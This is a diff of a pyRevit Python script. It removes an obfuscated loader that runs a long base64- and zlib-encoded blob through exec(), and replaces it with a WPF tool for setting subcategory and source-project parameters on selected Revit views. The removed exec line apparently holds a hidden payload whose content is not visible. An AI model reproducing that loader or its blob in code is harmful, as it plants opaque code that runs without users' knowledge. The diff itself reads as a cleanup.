@@ -1,2 +1,287 @@
-import base64, zlib
-exec(zlib.decompress(base64.b64decode('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')))
+﻿# PolyForm Internal Use 1.0.0 - Copyright (C) 2026 Javier Sols
+# Source available for inspection and authorized internal use only.
+
+"""
+ViewSubCategorizer
+Revit 2025 Compatible | .NET 8 | Persistent Engine
+v6 - Dual Parameter Support (Source & SubCategory)
+"""
+# --- 1. PERSISTENCE FLAG (CRITICAL) ---
+__persistentengine__ = True 
+__title__ = "View SubCat\nManager"
+__doc__ = "Modeless window for managing View SubCategories and Project Source."
+
+# --- 2. CORE IMPORTS & REFERENCES ---
+import clr
+import System
+
+# Load Assemblies
+clr.AddReference('System.Xml')
+clr.AddReference('PresentationFramework')
+clr.AddReference('PresentationCore')
+clr.AddReference('RevitAPI') 
+clr.AddReference('RevitAPIUI')
+
+from System.IO import StringReader
+from System.Collections.Generic import List
+from System.Xml import XmlReader
+from System.Windows.Markup import XamlReader
+from System.Windows.Interop import WindowInteropHelper
+
+# Import DB directly
+import Autodesk.Revit.DB as DB
+import Autodesk.Revit.UI as UI_API
+from pyrevit import revit, forms, UI
+
+# --- CONFIGURATION CONSTANTS (Global) ---
+P_T2_TYPE = "View.Type"
+P_T3_SUBCAT = "View.SubCategory"
+P_T3_SOURCE = "Source.Project"
+
+# --- HELPER FUNCTIONS ---
+def format_imperial_scale(scale_value):
+    scale_map = {1: '12" = 1\'-0"', 1.5: '8" = 1\'-0"', 2: '6" = 1\'-0"', 4: '3" = 1\'-0"', 
+                 8: '1 1/2" = 1\'-0"', 12: '1" = 1\'-0"', 16: '3/4" = 1\'-0"', 24: '1/2" = 1\'-0"', 
+                 32: '3/8" = 1\'-0"', 48: '1/4" = 1\'-0"', 64: '3/16" = 1\'-0"', 96: '1/8" = 1\'-0"', 
+                 128: '3/32" = 1\'-0"', 192: '1/16" = 1\'-0"', 384: '1/32" = 1\'-0"'}
+    return scale_map.get(scale_value, "1 : {}".format(int(scale_value)) if scale_value else "N/A")
+
+# --- DATA MODEL ---
+class ViewRow(object):
+    def __init__(self, view):
+        # We assume DB is available here (Main Thread execution)
+        self.view_ptr = view
+        self.name = view.Name or ""
+        
+        # 1. Type Parameters
+        p_type = view.get_Parameter(DB.BuiltInParameter.ELEM_TYPE_PARAM)
+        self.t2_ootb = p_type.AsValueString() if p_type else "N/A"
+        
+        p_t2c = view.LookupParameter(P_T2_TYPE)
+        self.t2_custom = p_t2c.AsString() if p_t2c and p_t2c.AsString() else ""
+        
+        self.view_scale = format_imperial_scale(view.Scale)
+        
+        # 2. Tier 3 - SubCategory
+        p_t3 = view.LookupParameter(P_T3_SUBCAT)
+        self.t3 = p_t3.AsString() if p_t3 and p_t3.AsString() else ""
+
+        # 3. Tier 3 - Source Project
+        p_src = view.LookupParameter(P_T3_SOURCE)
+        self.t3_source = p_src.AsString() if p_src and p_src.AsString() else ""
+
+# --- THE BRIDGE (EXTERNAL EVENT) ---
+class SubCatHandler(UI.IExternalEventHandler):
+    def __init__(self):
+        self.view_rows = []
+        self.new_value = ""
+        self.target_param = "" # Name of the parameter to update
+
+    def Execute(self, app):
+        # 1. Thread Safety Imports
+        import Autodesk.Revit.DB as DB
+        
+        if not self.view_rows or not self.target_param:
+            return
+
+        # Defensive check for valid document
+        try:
+            doc = self.view_rows[0].view_ptr.Document
+        except Exception:
+            return
+        
+        try:
+            with DB.Transaction(doc, "Update Metadata Modeless") as t:
+                t.Start()
+                for row in self.view_rows:
+                    if row.view_ptr.IsValidObject:
+                        # Use the dynamic target parameter name passed from UI
+                        p = row.view_ptr.LookupParameter(self.target_param)
+                        if p and not p.IsReadOnly:
+                            p.Set(self.new_value)
+                t.Commit()
+            
+            # Silent Success (No Toast)
+            
+        except Exception as e:
+            forms.alert("Transaction Failed: {}".format(e))
+
+    def GetName(self):
+        return "SubCatHandler"
+
+# --- GLOBAL HANDLER INSTANTIATION ---
+_handler = SubCatHandler()
+_event = UI.ExternalEvent.Create(_handler)
+
+# --- THE WINDOW ---
+class ModelessSubCategorizer(object):
+    def __init__(self):
+        # XAML updated with RadioButtons and new Column
+        xaml_str = """
+        <Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+                xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+                Title="ViewSubCategorizer" Height="600" Width="1100" WindowStartupLocation="CenterScreen" Topmost="True">
+            <Window.Resources>
+                <Style TargetType="DataGridCell">
+                    <Style.Triggers>
+                        <Trigger Property="IsSelected" Value="True">
+                            <Setter Property="Background" Value="#CCE8FF" /><Setter Property="Foreground" Value="Black" />
+                        </Trigger>
+                    </Style.Triggers>
+                </Style>
+            </Window.Resources>
+            <Grid Margin="15">
+                <Grid.RowDefinitions><RowDefinition Height="*"/><RowDefinition Height="Auto"/><RowDefinition Height="Auto"/><RowDefinition Height="Auto"/></Grid.RowDefinitions>
+                
+                <DataGrid Name="MainGrid" AutoGenerateColumns="False" CanUserAddRows="False" SelectionMode="Extended" SelectionUnit="FullRow" AlternatingRowBackground="#F9F9F9">
+                    <DataGrid.Columns>
+                        <DataGridTextColumn Header="View Name" Binding="{Binding name}" Width="2*" IsReadOnly="True"/>
+                        <DataGridTextColumn Header="Tier 2 [Type Name]" Binding="{Binding t2_ootb}" Width="1.2*" IsReadOnly="True"/>
+                        <DataGridTextColumn Header="Tier 2 [View.Type]" Binding="{Binding t2_custom}" Width="1.2*" IsReadOnly="True"/>
+                        <DataGridTextColumn Header="Scale" Binding="{Binding view_scale}" Width="0.8*" IsReadOnly="True"/>
+                        <DataGridTextColumn Header="Tier 3 [View.SubCategory]" Binding="{Binding t3}" Width="1.5*" IsReadOnly="True"/>
+                        <DataGridTextColumn Header="Tier 3 [Source.Project]" Binding="{Binding t3_source}" Width="1.5*" IsReadOnly="True"/>
+                    </DataGrid.Columns>
+                </DataGrid>
+                
+                <StackPanel Grid.Row="1" Margin="0,15,0,10">
+                    <StackPanel Orientation="Horizontal" Margin="0,0,0,5">
+                        <TextBlock Text="Apply to: " FontWeight="Bold" VerticalAlignment="Center" Margin="0,0,10,0"/>
+                        <RadioButton Name="RbSubCat" Content="View.SubCategory" GroupName="TargetParam" IsChecked="True" Margin="0,0,15,0" VerticalAlignment="Center"/>
+                        <RadioButton Name="RbSource" Content="Source.Project" GroupName="TargetParam" VerticalAlignment="Center"/>
+                    </StackPanel>
+                    
+                    <TextBlock Text="Select Value or Type New:" FontWeight="SemiBold" Margin="0,5,0,2"/>
+                    <ComboBox Name="ValueInput" IsEditable="True" Height="32"/>
+                </StackPanel>
+                
+                <Button Name="ApplyBtn" Grid.Row="2" Content="Apply Changes to Selected" Height="40" Background="#2196F3" Foreground="White" FontWeight="Bold"/>
+                <Button Name="RefreshBtn" Grid.Row="3" Content="Update List from Selection" Height="30" Margin="0,10,0,0"/>
+            </Grid>
+        </Window>
+        """
+        reader = XmlReader.Create(StringReader(xaml_str))
+        self.ui = XamlReader.Load(reader)
+        
+        # Element Binding
+        self.grid = self.ui.FindName("MainGrid")
+        self.combo = self.ui.FindName("ValueInput")
+        self.apply_btn = self.ui.FindName("ApplyBtn")
+        self.refresh_btn = self.ui.FindName("RefreshBtn")
+        self.rb_subcat = self.ui.FindName("RbSubCat")
+        self.rb_source = self.ui.FindName("RbSource")
+        
+        # Event Binding
+        self.apply_btn.Click += self.on_apply
+        self.refresh_btn.Click += self.on_refresh
+        self.grid.SelectionChanged += self.on_selection_change
+        
+        # Bind RadioButtons to selection change so dropdown updates immediately if toggled
+        self.rb_subcat.Checked += self.on_selection_change
+        self.rb_source.Checked += self.on_selection_change
+        
+        self.load_data()
+        
+        try:
+            handle = System.Diagnostics.Process.GetCurrentProcess().MainWindowHandle
+            WindowInteropHelper(self.ui).Owner = handle
+        except:
+            pass
+
+    def load_data(self):
+        import Autodesk.Revit.DB as DB
+        try:
+            uidoc = revit.uidoc
+            if uidoc:
+                selection_ids = uidoc.Selection.GetElementIds()
+                views = []
+                for eid in selection_ids:
+                    el = uidoc.Document.GetElement(eid)
+                    if isinstance(el, DB.View):
+                        views.append(el)
+                
+                self.grid.ItemsSource = [ViewRow(v) for v in views]
+                self.grid.Items.Refresh()
+        except Exception as e:
+            print("Refresh Error: {}".format(e))
+
+    def on_refresh(self, sender, e):
+        self.load_data()
+
+    def on_selection_change(self, sender, e):
+        # 1. Thread Safety Imports
+        import Autodesk.Revit.DB as DB
+        
+        # 2. Determine Active Parameter based on Radio Button
+        # Defaults to SubCategory if check fails
+        active_param = P_T3_SUBCAT 
+        if self.rb_source.IsChecked:
+            active_param = P_T3_SOURCE
+            
+        # 3. Populate Dropdown based on Active Parameter + View Type
+        if self.grid.SelectedItems.Count > 0:
+            try:
+                row = self.grid.SelectedItems[0]
+                ootb_type = row.t2_ootb
+                doc = row.view_ptr.Document 
+                
+                all_v = DB.FilteredElementCollector(doc).OfClass(DB.View)
+                vals = set()
+                
+                for v in all_v:
+                    p_type = v.get_Parameter(DB.BuiltInParameter.ELEM_TYPE_PARAM)
+                    # Filter: Only show values from views of the same "Type"
+                    if p_type and p_type.AsValueString() == ootb_type:
+                        p_target = v.LookupParameter(active_param)
+                        if p_target and p_target.AsString():
+                            vals.add(p_target.AsString())
+                
+                self.combo.ItemsSource = sorted(list(vals))
+            except Exception as ex:
+                print("Error in selection change: {}".format(ex))
+
+    def on_apply(self, sender, e):
+        try:
+            new_val = str(self.combo.Text)
+            
+            # Determine Target Parameter
+            target_param = P_T3_SUBCAT
+            is_source = False
+            if self.rb_source.IsChecked:
+                target_param = P_T3_SOURCE
+                is_source = True
+
+            selected_rows = []
+            for item in self.grid.SelectedItems:
+                selected_rows.append(item)
+                
+                # OPTIMISTIC UPDATE: Update correct UI column immediately
+                if is_source:
+                    item.t3_source = new_val
+                else:
+                    item.t3 = new_val
+            
+            if not selected_rows:
+                forms.alert("Please select rows in the grid first.")
+                return
+
+            # Pass data to global handler
+            _handler.view_rows = selected_rows
+            _handler.new_value = new_val
+            _handler.target_param = target_param
+            
+            # Raise Event
+            _event.Raise()
+            
+            # Refresh UI immediately
+            self.grid.Items.Refresh()
+            
+        except Exception as ex:
+            forms.alert("Apply Error: {}".format(ex))
+
+    def show(self):
+        self.ui.Show()
+
+if __name__ == "__main__":
+    main_window = ModelessSubCategorizer()
+    main_window.show()
